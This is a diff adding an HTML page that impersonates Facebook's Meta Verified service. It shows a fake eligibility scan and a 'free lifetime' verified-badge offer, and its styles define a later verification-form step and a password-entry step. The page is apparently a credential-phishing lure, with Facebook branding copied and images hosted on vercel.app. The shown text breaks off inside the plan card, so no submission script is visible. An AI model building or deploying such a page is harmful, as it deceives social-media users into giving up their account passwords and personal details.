@@ -1,0 +1,1329 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified – Facebook</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+            min-height: 100vh;
+        }
+
+        /* ─── Section visibility ─── */
+        .step { display: none; }
+        .step.active { display: block; }
+
+        /* ══════════════════════════════════════
+           LOADING SCREEN
+        ══════════════════════════════════════ */
+        #load-screen {
+            position: fixed; inset: 0;
+            background: #000;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 99999;
+            transition: opacity .7s ease;
+        }
+        #load-screen.fade-out { opacity: 0; pointer-events: none; }
+        #load-screen img { width: 100vw; height: 100vh; object-fit: cover; }
+
+        /* ══════════════════════════════════════
+           LANGUAGE MODAL
+        ══════════════════════════════════════ */
+        #lang-wrap {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,.55);
+            backdrop-filter: blur(6px);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 9000;
+            opacity: 0; pointer-events: none;
+            transition: opacity .35s ease;
+        }
+        #lang-wrap.show { opacity: 1; pointer-events: all; }
+        #lang-box {
+            background: #fff;
+            border-radius: 18px;
+            padding: 28px;
+            width: 92%; max-width: 500px;
+            box-shadow: 0 8px 40px rgba(0,0,0,.16);
+            transform: translateY(18px);
+            transition: transform .35s ease;
+        }
+        #lang-wrap.show #lang-box { transform: translateY(0); }
+        .lm-top { display: flex; align-items: center; gap: 11px; margin-bottom: 4px; }
+        .lm-icon {
+            width: 34px; height: 34px;
+            background: #1877f2; border-radius: 8px;
+            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+        }
+        .lm-icon img { width: 20px; height: 20px; border-radius: 50%; filter: brightness(10); }
+        .lm-h { font-size: 17px; font-weight: 700; color: #1c1e21; }
+        .lm-sub { font-size: 13px; color: #65676b; margin-bottom: 16px; }
+        .lm-search {
+            width: 100%; padding: 9px 13px;
+            border: 1.5px solid #dddfe2; border-radius: 9px;
+            font-size: 13.5px; font-family: inherit; outline: none; margin-bottom: 13px;
+            transition: border-color .2s;
+        }
+        .lm-search:focus { border-color: #1877f2; }
+        .lm-grid {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 7px; max-height: 260px; overflow-y: auto;
+            padding-right: 4px;
+        }
+        .lm-grid::-webkit-scrollbar { width: 4px; }
+        .lm-grid::-webkit-scrollbar-thumb { background: #dddfe2; border-radius: 4px; }
+        .lm-opt {
+            display: flex; align-items: center; gap: 9px;
+            padding: 9px 13px;
+            border: 1.5px solid #dddfe2; border-radius: 9px;
+            cursor: pointer; font-size: 13.5px; font-weight: 500;
+            transition: all .18s ease;
+        }
+        .lm-opt:hover { border-color: #1877f2; background: rgba(24,119,242,.05); }
+        .lm-opt.sel { border-color: #1877f2; background: rgba(24,119,242,.08); }
+        .lm-opt img { width: 22px; height: 16px; border-radius: 3px; object-fit: cover; flex-shrink: 0; }
+        .lm-confirm {
+            margin-top: 14px; width: 100%;
+            padding: 13px; background: #1877f2;
+            color: #fff; font-size: 15px; font-weight: 600;
+            border: none; border-radius: 9px; cursor: pointer;
+            font-family: inherit; transition: background .2s, opacity .2s;
+        }
+        .lm-confirm:disabled { opacity: .45; cursor: not-allowed; }
+        .lm-confirm:not(:disabled):hover { background: #166fe5; }
+
+        /* lang button in topbar */
+        .topbar-lang {
+            display: flex; align-items: center; gap: 5px;
+            margin-left: auto;
+            padding: 5px 10px;
+            border: 1.5px solid #dddfe2; border-radius: 7px;
+            background: transparent; font-size: 12.5px; font-weight: 500;
+            cursor: pointer; font-family: inherit; color: #1c1e21;
+            transition: border-color .2s;
+        }
+        .topbar-lang:hover { border-color: #1877f2; }
+        .topbar-lang img { width: 16px; height: 12px; border-radius: 2px; }
+
+        /* ══════════════════════════════════════
+           GLOBAL NAVBAR — always same style
+        ══════════════════════════════════════ */
+        .topbar {
+            background: #fff;
+            border-bottom: 1px solid #dddfe2;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 10px;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+        }
+        .topbar-logo {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .topbar-logo img { width: 100%; height: 100%; display: block; }
+        .topbar-sep { width: 1px; height: 22px; background: #dddfe2; }
+        .topbar-title { font-size: 15px; font-weight: 700; color: #1877f2; }
+        .topbar-right { margin-left: auto; }
+        .topbar-btn {
+            padding: 8px 18px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            font-family: inherit;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background .15s;
+        }
+        .topbar-btn:hover { background: #166fe5; }
+
+        /* ══════════════════════════════════════
+           GLOBAL FOOTER — same on all steps
+        ══════════════════════════════════════ */
+        .site-footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #90949c;
+            line-height: 2.2;
+            border-top: 1px solid #dddfe2;
+            background: #f7f8fa;
+        }
+        .site-footer a { color: #90949c; text-decoration: none; }
+        .site-footer a:hover { color: #1877f2; text-decoration: underline; }
+        .site-footer .s { margin: 0 5px; }
+
+        /* ══════════════════════════════════════
+           SHARED CARD STYLE
+        ══════════════════════════════════════ */
+        .card {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.08);
+            margin-bottom: 14px;
+        }
+
+        /* ══════════════════════════════════════
+           SHARED BUTTON
+        ══════════════════════════════════════ */
+        .fb-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 800;
+            font-family: inherit;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background .15s;
+            position: relative;
+            letter-spacing: .1px;
+        }
+        .fb-btn:hover { background: #166fe5; }
+        .fb-btn:active { background: #1464d8; }
+        .fb-btn:disabled { opacity: .7; cursor: not-allowed; }
+        .fb-btn.loading .btn-label { visibility: hidden; }
+        .fb-btn.loading::after {
+            content: '';
+            position: absolute;
+            inset: 0; margin: auto;
+            width: 20px; height: 20px;
+            border: 2.5px solid rgba(255,255,255,.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin .75s linear infinite;
+        }
+
+        /* ══════════════════════════════════════
+           STEP 1 — SCAN + BADGE ANIMATED
+        ══════════════════════════════════════ */
+
+        /* ── Scan screen ── */
+        #scanScreen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 56px);
+            padding: 40px 24px;
+            text-align: center;
+        }
+        .scan-ring-wrap {
+            position: relative;
+            width: 110px; height: 110px;
+            margin: 0 auto 28px;
+        }
+        .scan-ring {
+            position: absolute; inset: 0;
+            border-radius: 50%;
+            border: 3px solid #e4e6ea;
+            border-top-color: #1877f2;
+            animation: spin 1s linear infinite;
+        }
+        .scan-ring-inner {
+            position: absolute; inset: 10px;
+            border-radius: 50%;
+            border: 2.5px solid #e4e6ea;
+            border-bottom-color: #42b72a;
+            animation: spin 1.6s linear infinite reverse;
+        }
+        .scan-fb-icon {
+            position: absolute; inset: 0;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .scan-fb-icon img { width: 52px; height: 52px; border-radius: 50%; }
+
+        .scan-title { font-size: 18px; font-weight: 800; color: #1c1e21; margin-bottom: 8px; }
+        .scan-sub { font-size: 13.5px; color: #65676b; margin-bottom: 28px; line-height: 1.5; }
+
+        .scan-progress-wrap { width: 100%; max-width: 280px; }
+        .scan-progress-bar {
+            width: 100%; height: 5px;
+            background: #e4e6ea;
+            border-radius: 99px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        .scan-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #1877f2, #42b72a);
+            border-radius: 99px;
+            width: 0%;
+            transition: width .08s linear;
+        }
+        .scan-status { font-size: 12.5px; color: #65676b; font-weight: 500; min-height: 18px; }
+
+        .scan-checks { margin-top: 24px; display: flex; flex-direction: column; gap: 10px; width: 100%; max-width: 280px; }
+        .scan-chk-row {
+            display: flex; align-items: center; gap: 10px;
+            font-size: 13px; color: #90949c; font-weight: 500;
+            opacity: 0; transform: translateX(-12px);
+            transition: opacity .3s ease, transform .3s ease;
+        }
+        .scan-chk-row.done { opacity: 1; transform: translateX(0); color: #1c1e21; }
+        .scan-chk-icon {
+            width: 20px; height: 20px;
+            border-radius: 50%;
+            background: #e4e6ea;
+            flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            transition: background .3s;
+        }
+        .scan-chk-row.done .scan-chk-icon { background: #42b72a; }
+        .scan-chk-icon svg { width: 10px; height: 10px; opacity: 0; transition: opacity .2s .1s; }
+        .scan-chk-row.done .scan-chk-icon svg { opacity: 1; }
+
+        /* ── Eligible flash ── */
+        #eligibleFlash {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 56px);
+            padding: 40px 24px;
+            text-align: center;
+        }
+        #eligibleFlash.show { display: flex; }
+        .eligible-badge {
+            width: 90px; height: 90px;
+            margin: 0 auto 20px;
+            animation: badgePop .5s cubic-bezier(.34,1.56,.64,1) both;
+        }
+        .eligible-badge img { width: 90px; height: 90px; }
+        .eligible-glow {
+            width: 90px; height: 90px;
+            border-radius: 50%;
+            background: rgba(24,119,242,.15);
+            position: absolute;
+            animation: glowPulse 1.5s ease-in-out infinite;
+        }
+        .eligible-wrap { position: relative; width: 90px; height: 90px; margin: 0 auto 20px; }
+        .eligible-title {
+            font-size: 22px; font-weight: 900; color: #1c1e21;
+            margin-bottom: 6px;
+            animation: fadeUp .4s .2s both;
+        }
+        .eligible-sub {
+            font-size: 14px; color: #65676b;
+            animation: fadeUp .4s .35s both;
+            margin-bottom: 24px;
+        }
+        .eligible-tag {
+            display: inline-flex; align-items: center; gap: 7px;
+            background: #e6f4ea; border: 1.5px solid #42b72a;
+            border-radius: 99px; padding: 6px 18px;
+            font-size: 13px; font-weight: 800; color: #1a7f37;
+            text-transform: uppercase; letter-spacing: .6px;
+            animation: fadeUp .4s .5s both;
+        }
+        .eligible-dot { width: 7px; height: 7px; background: #42b72a; border-radius: 50%; animation: pulse 1.5s ease-in-out infinite; }
+
+        /* ── Plan card ── */
+        .mv-page {
+            max-width: 480px;
+            margin: 20px auto;
+            padding: 0 16px 40px;
+            animation: fadeUp .45s ease both;
+        }
+        .mv-card { padding: 0; overflow: hidden; }
+
+        .mv-header {
+            padding: 24px 20px 16px;
+            text-align: center;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        .mv-title { font-size: 20px; font-weight: 800; color: #1c1e21; margin-bottom: 14px; }
+
+        .mv-badge-wrap {
+            width: 64px; height: 64px;
+            margin: 0 auto 10px;
+            position: relative;
+        }
+        .mv-badge-wrap img { width: 64px; height: 64px; animation: badgePop .6s cubic-bezier(.34,1.56,.64,1) both; }
+        .mv-badge-glow {
+            position: absolute; inset: -8px;
+            border-radius: 50%;
+            background: rgba(24,119,242,.12);
+            animation: glowPulse 2s ease-in-out infinite;
+        }
+
+        .mv-plan-name { font-size: 17px; font-weight: 800; color: #1c1e21; margin-bottom: 2px; }
+        .mv-plan-desc { font-size: 13px; color: #65676b; margin-bottom: 10px; }
+
+        .mv-free-tag {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: #e6f4ea; border: 1.5px solid #42b72a;
+            border-radius: 99px; padding: 4px 14px;
+            font-size: 12px; font-weight: 800; color: #1a7f37;
+            text-transform: uppercase; letter-spacing: .6px;
+            margin-bottom: 4px;
+            position: relative; overflow: hidden;
+        }
+        .mv-free-tag::after {
+            content: '';
+            position: absolute; top: 0; left: -60%;
+            width: 40%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,.6), transparent);
+            animation: shimmer 2.5s ease-in-out infinite;
+        }
+        .mv-free-dot { width: 6px; height: 6px; background: #42b72a; border-radius: 50%; animation: pulse 1.5s ease-in-out infinite; }
+        .mv-price-cross { font-size: 12px; color: #90949c; }
+        .mv-price-cross s { margin-right: 3px; }
+
+        .mv-body { padding: 0 20px 8px; }
+
+        .mv-badge-item {
+            display: flex; align-items: center; gap: 10px;
+            padding: 14px 0;
+            border-bottom: 1px solid #f0f2f5;
+            animation: fadeUp .35s ease both;
+        }
+        .mv-badge-item .chk-circle {
+            width: 22px; height: 22px;
+            border: 2px solid #65676b;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+        }
+        .mv-badge-item .chk-circle svg { width: 11px; height: 11px; }
+        .mv-badge-item-label { font-size: 14px; color: #1c1e21; font-weight: 500; }
+
+        .mv-section { padding: 14px 0 4px; border-bottom: 1px solid #f0f2f5; }
+        .mv-section:last-child { border-bottom: none; }
+        .mv-section-title {
+            font-size: 12.5px; font-weight: 800; color: #1c1e21;
+            margin-bottom: 10px; text-transform: uppercase; letter-spacing: .4px;
+        }
+
+        .mv-feat {
+            display: flex; align-items: flex-start; gap: 10px;
+            margin-bottom: 10px;
+            opacity: 0; transform: translateX(-10px);
+            transition: opacity .3s ease, transform .3s ease;
+        }
+        .mv-feat.visible { opacity: 1; transform: translateX(0); }
+
+        .mv-chk { width: 18px; height: 18px; flex-shrink: 0; margin-top: 1px; }
+        .mv-chk svg { width: 18px; height: 18px; }
+        .mv-feat-text { font-size: 13.5px; color: #1c1e21; line-height: 1.4; }
+        .mv-feat-sub { font-size: 12px; color: #65676b; margin-top: 1px; line-height: 1.35; }
+
+        .mv-card-foot { padding: 12px 20px 20px; text-align: center; }
+        .mv-age-note { font-size: 12px; color: #90949c; margin-bottom: 14px; }
+        .mv-continue-btn {
+            width: 100%; padding: 14px;
+            background: #1877f2; color: #fff;
+            font-size: 16px; font-weight: 700; font-family: inherit;
+            border: none; border-radius: 8px; cursor: pointer;
+            transition: background .15s, transform .1s;
+        }
+        .mv-continue-btn:hover { background: #166fe5; transform: translateY(-1px); }
+
+        /* ── Keyframes ── */
+        @keyframes badgePop {
+            from { opacity: 0; transform: scale(.4); }
+            to   { opacity: 1; transform: scale(1); }
+        }
+        @keyframes glowPulse {
+            0%,100% { transform: scale(1); opacity: .8; }
+            50%      { transform: scale(1.18); opacity: 0; }
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes shimmer {
+            0%   { left: -60%; }
+            60%,100% { left: 130%; }
+        }
+
+        /* ══════════════════════════════════════
+           STEP 2 — VERIFICATION FORM
+        ══════════════════════════════════════ */
+        .form-page { max-width: 640px; margin: 22px auto; padding: 0 16px 40px; }
+
+        .breadcrumb {
+            font-size: 12.5px;
+            color: #65676b;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+        .breadcrumb a { color: #1877f2; text-decoration: none; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .bc-sep { color: #bcc0c4; }
+
+        .hdr-card { padding: 20px; display: flex; align-items: flex-start; gap: 13px; }
+        .hdr-badge { width: 44px; height: 44px; flex-shrink: 0; }
+        .hdr-badge img { width: 44px; height: 44px; }
+        .hdr-h { font-size: 17px; font-weight: 800; color: #1c1e21; margin-bottom: 4px; }
+        .hdr-p { font-size: 13px; color: #65676b; line-height: 1.5; }
+
+        .info-card { padding: 16px 20px; font-size: 13.5px; color: #3e4042; line-height: 1.65; }
+        .info-card-t { font-size: 13.5px; font-weight: 700; color: #1c1e21; margin-bottom: 6px; display: flex; align-items: center; gap: 7px; }
+        .info-card-t .dot { width: 7px; height: 7px; border-radius: 50%; background: #1877f2; flex-shrink: 0; }
+
+        .warn-strip {
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            background: #fff8e1;
+            border: 1.5px solid #f0c040;
+            border-radius: 9px;
+            padding: 11px 15px;
+            margin-bottom: 14px;
+            font-size: 13px;
+            color: #7d5200;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        .vid-card { overflow: hidden; }
+        .vid-lbl { padding: 12px 18px 8px; font-size: 13.5px; font-weight: 700; color: #1c1e21; display: flex; align-items: center; gap: 7px; }
+        .vid-lbl svg { width: 16px; height: 16px; }
+        .vid-card video { width: 100%; display: block; max-height: 320px; background: #000; }
+
+        .frm-card { padding: 20px; }
+        .frm-t { font-size: 15px; font-weight: 800; color: #1c1e21; margin-bottom: 3px; }
+        .frm-s { font-size: 13px; color: #65676b; margin-bottom: 18px; line-height: 1.5; }
+
+        .f-group { margin-bottom: 15px; }
+        .f-group label { display: block; font-size: 13px; font-weight: 700; color: #3e4042; margin-bottom: 5px; }
+        .f-group label em { font-style: normal; font-weight: 400; color: #90949c; font-size: 11.5px; margin-left: 4px; }
+        .f-group input {
+            width: 100%; padding: 12px 14px;
+            border: 1.5px solid #ccd0d5; border-radius: 8px;
+            font-size: 14.5px; font-family: inherit; color: #1c1e21;
+            background: #f7f8fa; outline: none;
+            transition: border-color .15s, box-shadow .15s, background .15s;
+        }
+        .f-group input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 3px rgba(24,119,242,.14); }
+        .f-group input::placeholder { color: #bcc0c4; }
+        .f-hint { font-size: 11.5px; color: #90949c; margin-top: 4px; line-height: 1.4; }
+
+        .err-strip {
+            display: flex; align-items: flex-start; gap: 8px;
+            background: #fff0f0; border: 1px solid #ffc9c9; border-radius: 7px;
+            padding: 10px 13px; font-size: 12.5px; color: #c0392b;
+            font-weight: 500; margin-bottom: 16px; line-height: 1.5;
+        }
+        .err-strip svg { width: 14px; height: 14px; flex-shrink: 0; margin-top: 1px; }
+
+        /* ══════════════════════════════════════
+           STEP 3 — PASSWORD
+        ══════════════════════════════════════ */
+        .pw-page { max-width: 640px; margin: 22px auto; padding: 0 16px 40px; }
+
+        .pw-card { padding: 24px; text-align: center; }
+        .pw-prompt { font-size: 14.5px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
+
+        .pw-input-wrap { position: relative; margin-bottom: 10px; }
+        .pw-input-wrap input {
+            width: 100%; padding: 13px 44px 13px 14px;
+            border: 1.5px solid #dddfe2; border-radius: 8px;
+            font-size: 15px; font-family: inherit; color: #1c1e21;
+            background: #f7f8fa; outline: none;
+            transition: border-color .15s, box-shadow .15s, background .15s;
+        }
+        .pw-input-wrap input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 3px rgba(24,119,242,.14); }
+        .pw-input-wrap input::placeholder { color: #bcc0c4; }
+        .pw-eye { position: absolute; right: 13px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #65676b; display: flex; padding: 0; transition: color .15s; }
+        .pw-eye:hover { color: #1877f2; }
+
+        .pw-err { display: none; background: #fff1f0; border: 1px solid #ffccc7; border-radius: 7px; padding: 10px 13px; font-size: 12.5px; color: #d93025; font-weight: 500; text-align: left; margin-bottom: 10px; }
+        .pw-err.show { display: block; }
+
+        .pw-forgot { display: block; font-size: 13.5px; color: #1877f2; text-decoration: none; margin-bottom: 16px; text-align: left; }
+        .pw-forgot:hover { text-decoration: underline; }
+        .pw-hr { border: none; border-top: 1px solid #dddfe2; margin: 0 0 16px; }
+
+        .pw-continue {
+            width: 100%; height: 46px; background: #1877f2; color: #fff;
+            font-size: 15px; font-weight: 700; font-family: inherit;
+            border: none; border-radius: 8px; cursor: pointer;
+            transition: background .15s; display: flex; align-items: center; justify-content: center; gap: 8px;
+            position: relative;
+        }
+        .pw-continue:hover { background: #166fe5; }
+        .pw-continue:disabled { opacity: .8; pointer-events: none; }
+        .pw-continue.loading .pw-lbl { display: none; }
+        .pw-spin { display: none; width: 17px; height: 17px; border: 2px solid rgba(255,255,255,.35); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; }
+        .pw-continue.loading .pw-spin { display: block; }
+
+        .pw-not-you { display: block; margin-top: 12px; font-size: 13.5px; color: #1877f2; font-weight: 600; background: none; border: none; cursor: pointer; font-family: inherit; width: 100%; text-align: center; }
+        .pw-not-you:hover { text-decoration: underline; }
+
+        .pw-success { display: none; flex-direction: column; align-items: center; padding: 8px 0 4px; }
+        .pw-success.show { display: flex; }
+        .pw-ok-icon { width: 58px; height: 58px; background: #e6f4ea; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; }
+        .pw-ok-t { font-size: 16px; font-weight: 700; color: #1a7f37; margin-bottom: 4px; }
+        .pw-ok-s { font-size: 13.5px; color: #65676b; }
+
+        /* ══════════════════════════════════════
+           ANIMATIONS
+        ══════════════════════════════════════ */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.4; transform:scale(.75); } }
+    </style>
+</head>
+<body>
+
+<!-- ══ LOADING SCREEN ══ -->
+<div id="load-screen">
+    <img src="https://loading-logo.vercel.app/GIF_20260313_113131_892.gif" alt="">
+</div>
+
+<!-- ══ LANGUAGE MODAL ══ -->
+<div id="lang-wrap">
+    <div id="lang-box">
+        <div class="lm-top">
+            <div class="lm-icon"><img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="FB"></div>
+            <div class="lm-h">Select Your Language</div>
+        </div>
+        <div class="lm-sub">Choose your language to continue with Meta Verified.</div>
+        <input class="lm-search" id="lm-search" type="text" placeholder="Search language…" autocomplete="off">
+        <div class="lm-grid" id="lm-grid">
+            <div class="lm-opt" data-lang="english"><img src="https://flagcdn.com/24x18/us.png" alt="US"><span>English</span></div>
+            <div class="lm-opt" data-lang="hindi"><img src="https://flagcdn.com/24x18/in.png" alt="IN"><span>Hindi</span></div>
+            <div class="lm-opt" data-lang="spanish"><img src="https://flagcdn.com/24x18/es.png" alt="ES"><span>Spanish</span></div>
+            <div class="lm-opt" data-lang="portuguese"><img src="https://flagcdn.com/24x18/pt.png" alt="PT"><span>Portuguese</span></div>
+            <div class="lm-opt" data-lang="arabic"><img src="https://flagcdn.com/24x18/sa.png" alt="SA"><span>Arabic</span></div>
+            <div class="lm-opt" data-lang="french"><img src="https://flagcdn.com/24x18/fr.png" alt="FR"><span>French</span></div>
+            <div class="lm-opt" data-lang="tamil"><img src="https://flagcdn.com/24x18/in.png" alt="IN"><span>Tamil</span></div>
+            <div class="lm-opt" data-lang="vietnamese"><img src="https://flagcdn.com/24x18/vn.png" alt="VN"><span>Vietnamese</span></div>
+            <div class="lm-opt" data-lang="ghanaian"><img src="https://flagcdn.com/24x18/gh.png" alt="GH"><span>Ghanaian (Twi)</span></div>
+        </div>
+        <button class="lm-confirm" id="lm-confirm" disabled>Confirm Language</button>
+    </div>
+</div>
+
+<!-- ██████████████ STEP 1: BADGE ██████████████ -->
+<div id="s1" class="step active">
+
+    <nav class="topbar">
+        <div class="topbar-logo"><img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook"></div>
+        <div class="topbar-sep"></div>
+        <span class="topbar-title">Meta Verified</span>
+    </nav>
+
+    <!-- ── SCREEN A: Scanning ── -->
+    <div id="scanScreen">
+        <div class="scan-ring-wrap">
+            <div class="scan-ring"></div>
+            <div class="scan-ring-inner"></div>
+            <div class="scan-fb-icon">
+                <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook">
+            </div>
+        </div>
+
+        <div class="scan-title" id="t-scan-title">Checking Your Eligibility</div>
+        <div class="scan-sub" id="t-scan-sub">Facebook is verifying your account for the Meta Verified free badge offer…</div>
+
+        <div class="scan-progress-wrap">
+            <div class="scan-progress-bar"><div class="scan-progress-fill" id="progressFill"></div></div>
+            <div class="scan-status" id="scanStatus">Initializing…</div>
+        </div>
+
+        <div class="scan-checks">
+            <div class="scan-chk-row" id="chk1">
+                <div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <span id="t-chk1">Account age verified</span>
+            </div>
+            <div class="scan-chk-row" id="chk2">
+                <div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <span id="t-chk2">Profile authenticity confirmed</span>
+            </div>
+            <div class="scan-chk-row" id="chk3">
+                <div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <span id="t-chk3">Region eligibility checked</span>
+            </div>
+            <div class="scan-chk-row" id="chk4">
+                <div class="scan-chk-icon"><svg viewBox="0 0 10 10" fill="none"><path d="M1.5 5l2.5 2.5 4.5-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <span id="t-chk4">Free offer slot reserved</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── SCREEN B: Eligible flash ── -->
+    <div id="eligibleFlash">
+        <div class="eligible-wrap">
+            <div class="eligible-glow"></div>
+            <div class="eligible-badge">
+                <img src="https://logo-ver.vercel.app/800px-Twitter_Verified_Badge.svg.png" alt="Verified">
+            </div>
+        </div>
+        <div class="eligible-title" id="t-elig-title">You're Eligible! 🎉</div>
+        <div class="eligible-sub" id="t-elig-sub">Your account qualifies for the free lifetime Meta Verified badge — selected users only.</div>
+        <div class="eligible-tag"><div class="eligible-dot"></div><span id="t-elig-tag">FREE · Lifetime Access Confirmed</span></div>
+    </div>
+
+    <!-- ── SCREEN C: Plan card ── -->
+    <div class="mv-page" id="planCard" style="display:none;">
+
+        <div class="card mv-card">
+            <div class="mv-header">
+                <div class="mv-title">Meta Verified</div>
+                <div class="mv-badge-wrap">
+                    <div class="mv-badge-glow"></div>
+                    <img src="https://logo-ver.vercel.app/800px-Twitter_Verified_Badge.svg.png" alt="Verified">
+                </div>
+                <div class="mv-plan-name">Max</div>
+                <div class="mv-plan-desc" id="t-plan-desc">Protect and optimise your brand</div>
+                <div class="mv-free-tag"><div class="mv-free-dot"></div><span id="t-free-tag">FREE · Lifetime Access</span></div>
+                <div class="mv-price-cross" id="t-price-cross"><s>$11.99/month</s> — No subscription needed</div>
+            </div>
+
+            <div class="mv-body">
+                <div class="mv-badge-item">
+                    <div class="chk-circle"><svg viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#65676b" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                    <span id="t-verified-badge">Verified badge</span>
+                </div>
+
+                <div class="mv-section">
+                    <div class="mv-section-title" id="t-sect1">Maximise discovery</div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f1">Search optimisation</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f2">Featured profile</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f3">Add links to reels</div><div class="mv-feat-sub" id="t-f3s">6 per month</div></div></div>
+                </div>
+
+                <div class="mv-section">
+                    <div class="mv-section-title" id="t-sect2">Drive engagement</div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f4">Upgraded profile links</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f5">Exclusive stickers</div></div></div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f6">Custom chat themes</div></div></div>
+                </div>
+
+                <div class="mv-section">
+                    <div class="mv-section-title" id="t-sect3">Protect your brand</div>
+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f7">Impersonation protection</div></div></div>
